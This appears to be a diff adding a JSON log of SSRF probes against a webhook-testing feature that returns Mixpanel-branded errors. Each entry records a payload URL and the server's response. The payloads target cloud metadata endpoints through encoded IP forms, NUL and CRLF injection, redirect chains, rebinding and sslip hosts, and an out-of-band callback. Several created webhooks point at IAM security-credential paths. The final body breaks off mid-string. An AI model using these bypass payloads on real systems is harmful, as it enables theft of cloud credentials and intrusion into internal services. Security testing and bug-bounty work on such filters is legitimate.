@@ -1,0 +1,267 @@
+{
+  "results": [
+    {
+      "tag": "zp-0169",
+      "url": "http://169.0254.0169.0254/latest/meta-data/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: fa8264cfc5324ab4a38deb952b5e9dad\"\n}\n"
+    },
+    {
+      "tag": "zp-0xa9",
+      "url": "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "zp-mixed-hex",
+      "url": "http://0xa9fe.0xa9fe/latest/meta-data/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: c2587ce1542e4ffcbf46ea60b28a7495\"\n}\n"
+    },
+    {
+      "tag": "zp-0xa9fe-decimal",
+      "url": "http://0xa9fe.43518/latest/meta-data/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 342f5e07ae754c7e92222a7bce6d43c6\"\n}\n"
+    },
+    {
+      "tag": "zp-decimal-leadzero",
+      "url": "http://02852039166/latest/meta-data/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 7eb98a2e8d524fda8f68f26861f962fb\"\n}\n"
+    },
+    {
+      "tag": "zp-9digit",
+      "url": "http://2852039166/latest/meta-data/iam/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "zp-decimal-with-port",
+      "url": "http://2852039166:80/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "zp-5octets",
+      "url": "http://169.254.169.254.1/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: e6706b59ba4f44f28b1454fd5e4b295a\"\n}\n"
+    },
+    {
+      "tag": "zp-2octets",
+      "url": "http://169.254/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "zp-3octets",
+      "url": "http://169.254.43518/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "zp-empty-path",
+      "url": "http://169.254.169.254",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "zp-mixed",
+      "url": "http://0xA9.254.0251.0xfe/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "nul-pre",
+      "url": "http://169.254.169.254%00/latest/meta-data/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 931f7f51cb8343eea8a12c496f914a65\"\n}\n"
+    },
+    {
+      "tag": "nul-mid",
+      "url": "http://169.254.169.254/%00/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "nul-host-prefix",
+      "url": "http://%00169.254.169.254/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: cdafaea1bd6b49f7b473a381fab5d957\"\n}\n"
+    },
+    {
+      "tag": "nul-after-host",
+      "url": "http://webhook.site%00@169.254.169.254/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "nul-encoded-double",
+      "url": "http://169.254.169.254%2500/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 1f4b16c6c05f4e258a0144d7844fb61c\"\n}\n"
+    },
+    {
+      "tag": "cr-host",
+      "url": "http://169.254.169.254%0d/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 21f2fb312b0a4005baaec48e451d2174\"\n}\n"
+    },
+    {
+      "tag": "lf-host",
+      "url": "http://169.254.169.254%0a/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: b69029866338436984a134b649dc34d7\"\n}\n"
+    },
+    {
+      "tag": "tab-host",
+      "url": "http://169.254.169.254%09/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 4273b14fb64842aeb35694a52f8cac25\"\n}\n"
+    },
+    {
+      "tag": "space-host",
+      "url": "http://169.254.169.254%20/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 6d1b384f4f644b69850742cd4029790e\"\n}\n"
+    },
+    {
+      "tag": "crlf-meta-flavor",
+      "url": "http://metadata.google.internal/computeMetadata/v1/instance/%0d%0aMetadata-Flavor:%20Google",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "chain-httpbin-x2-imds",
+      "url": "https://httpbin.org/redirect-to?url=https%3A%2F%2Fhttpbin.org%2Fredirect-to%3Furl%3Dhttp%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252F%26status_code%3D302&status_code=302",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "chain-30hop",
+      "url": "https://httpbin.org/redirect/30",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "rel-redirect-imds",
+      "url": "https://httpbin.org/relative-redirect/1?Location=http://169.254.169.254/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "double-encode-imds",
+      "url": "http://169.254.169.254%252Flatest%252Fmeta-data%252F",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: abf27836ec7f4bf6be5b94e28f229119\"\n}\n"
+    },
+    {
+      "tag": "triple-slash-imds",
+      "url": "http:///169.254.169.254/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "uppercase-scheme",
+      "url": "HTTP://169.254.169.254/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "mixed-scheme",
+      "url": "HtTp://169.254.169.254/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "ftp-scheme",
+      "url": "ftp://169.254.169.254/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 40622de74219444fb1baeeeafab72c0a\"\n}\n"
+    },
+    {
+      "tag": "https-imds",
+      "url": "https://169.254.169.254/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "creds-imds",
+      "url": "http://AKIA:secret@169.254.169.254/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "idn-mgi",
+      "url": "http://xn--metadata-fya.google.internal/computeMetadata/v1/instance/",
+      "status": 500,
+      "body_500": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: c57b2047a70e4dd4938597ff47f1d2e7\"\n}\n"
+    },
+    {
+      "tag": "nip-80",
+      "url": "http://169-254-169-254.sslip.io/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "sslip",
+      "url": "http://169.254.169.254.sslip.io/latest/meta-data/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "oast-dns-only",
+      "url": "http://imdsprobe-ea44d26c.9a80587a.x.example.com/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "oast-uniq-tag-1",
+      "url": "https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/oast-uniq-e911c63a",
+      "status": 200,
+      "body_500": "{\"status\": \"ok\", \"results\": {\"success\": true, \"status_code\": 302, \"message\": \"Webhook responded with status 302\"}}"
+    },
+    {
+      "tag": "oast-host-imds",
+      "url": "http://169-254-169-254.9a80587a-10b4-4350-97b2-6121770760eb.webhook.site/",
+      "status": 400,
+      "body_500": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "action": "create",
+      "name": "create-imds-1",
+      "status": 200,
+      "body": "{\"status\": \"ok\", \"results\": {\"id\": \"bbe9419f-1ee4-4840-8e81-273686ad2324\", \"name\": \"create-imds-1\"}}"
+    },
+    {
+      "action": "create",
+      "name": "create-meta-2",
+      "status": 200,
+      "body": "{\"status\": \"ok\", \"results\": {\"id\": \"d9273fe2-2ff7-452b-8edf-1868291767eb\", \"name\": \"create-meta-2\"}}"
+    },
+    {
+      "action": "create",
+      "name": "create-localhost",
+      "status": 200,
+      "body": "{\"status\": \"ok\", \"results\": {\"id\": \"8c9338ac-35db-456d-a6a9-c1a737a9fe41\", \"name\": \"create-localhost\"}}"
+    },
+    {
+      "action": "create",
+      "name": "create-redir",
+      "status": 200,
+      "body": "{\"status\": \"ok\", \"results\": {\"id\": \"6b4b8a8f-0965-45f3-9264-07109996ab08\", \"name\": \"create-redir\"}}"
+    },
+    {
+      "action": "create",
+      "name": "create-rbndr",
+      "status": 200,
+      "body": "{\"status\": \"ok\", \"results\": {\"id\": \"e9a1dc57-465a-41d8-8eb1-d82a0156f111\", \"name\": \"create-rbndr\"}}"
+    },
+    {
+      "action": "list",
+      "status": 200,
+      "body": "{\"status\": \"ok\", \"results\": [{\"id\": \"3b82f560-d587-4b8f-9c71-f35ae4d092c8\", \"name\": \"test\", \"url\": \"https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/test3\", \"is_enabled\": true, \"created\": \"2026-05-30T16:38:27.755\", \"modified\": \"2026-05-30T16:38:27.899\", \"creator_id\": 6492622, \"creator_name\": \"account mix  lastname\"}, {\"id\": \"bbe9419f-1ee4-4840-8e81-273686ad2324\", \"name\": \"create-imds-1\", \"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\", \"is_enabled\": true, \"created\": \"2026-05-30T16:50:02.811\", \"modified\": \"2026-05-30T16:50:02.941\", \"creator_id\": 6492622, \"creator_name\": \"account mix  lastname\"}, {\"id\": \"d9273fe2-2ff7-452b-8edf-1868291767eb\", \"name\": \"create-meta-2\", \"url\": \"http://metadata.google.internal/computeMetadata/v1/instance/\", \"is_enabled\": true, \"created\": \"2026-05-30T16:50:04.839\", \"modified\": \"2026-05-30T16:50:04.991\", \"creator_id\": 6492622, \"creator_name\": \"account mix  lastname\"}, {\"id\": \"8c9338ac-35db-456d-a6a9-c1a737a9fe41\", \"name\": \"c"
+    }
+  ]
+}
